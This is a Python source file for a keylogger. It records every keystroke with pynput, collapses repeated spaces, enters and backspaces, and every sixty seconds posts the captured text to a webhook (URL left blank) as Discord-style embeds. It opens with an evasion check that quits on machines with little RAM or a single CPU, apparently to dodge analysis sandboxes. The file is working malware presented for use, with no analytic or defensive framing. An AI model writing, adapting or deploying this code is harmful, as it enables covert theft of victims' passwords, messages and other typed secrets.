from multiprocessing import cpu_count
from psutil import virtual_memory

cpu_count = cpu_count()
ram_size = int(round(virtual_memory().total / (1024 ** 3)))

if __name__ == "__main__":
    if ram_size <= 2 or cpu_count < 2:
        exit()

    from threading import Timer
    from pynput import keyboard
    from datetime import datetime
    from requests import post, get, ConnectionError

    cache = []
    timer = None
    seconds = 60
    webhook_url = ''
    space_count, enter_count, backspace_count = 1, 1, 1

    inputs = {
        96: '0',
        97: '1',
        98: '2',
        99: '3',
        100: '4',
        101: '5',
        102: '6',
        103: '7',
        104: '8',
        105: '9',
    }

    def check_connection():
        try:
            get('https://www.google.com', timeout=5)
            return True
        except ConnectionError:
            return False

    def send_cache():
        global cache
        if cache:
            if check_connection():
                now = datetime.now()
                start_dt = now.strftime('%Y/%m/%d %H:%M:%S')
                cache = ''.join(i for i in cache)
                post(webhook_url, json={
                    'embeds': [{
                        'title': f'[{start_dt}]',
                        "color": 0x3498DB,
                        'description': f'{cache}'
                    }]
                })
                cache = []

    def on_press(key):
        global cache, timer, space_count, enter_count, backspace_count
        try:
            if hasattr(key, 'vk') and 96 <= key.vk <= 105:
                cache.append(inputs[key.vk])
            else:
                cache.append(key.char)
            enter_count = 1
            space_count = 1
            backspace_count = 1
        except AttributeError:
            # WARN: this is badly made xD, I'm sorry
            if key.name == 'space':
                if cache and cache[-1] == ' ' or space_count != 1:
                    space_count += 1
                    cache[-1] = (f'[{key.name}x{space_count}]')
                else:
                    cache.append(' ')
                enter_count = 1
                backspace_count = 1
            elif key.name == 'enter':
                if cache and cache[-1] == '\n' or enter_count != 1:
                    enter_count += 1
                    cache[-1] = (f'[{key.name}x{enter_count}]')
                else:
                    cache.append('\n')
                space_count = 1
                backspace_count = 1
            elif key.name == 'backspace':
                if cache and cache[-1] == '[backspace]' or backspace_count != 1:
                    backspace_count += 1
                    cache[-1] = (f'[{key.name}x{backspace_count}]')
                else:
                    cache.append(f'[{key.name}]')
                enter_count = 1
                space_count = 1
            else:
                cache.append(f'[{key.name}]')
                space_count = 1
                enter_count = 1
                backspace_count = 1
        if timer and len(cache) <= 500:
            timer.cancel()
            timer = Timer(seconds, send_cache)
            timer.start()
        elif not timer:
            timer = Timer(seconds, send_cache)
            timer.start()

    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    keyboard_listener.join()
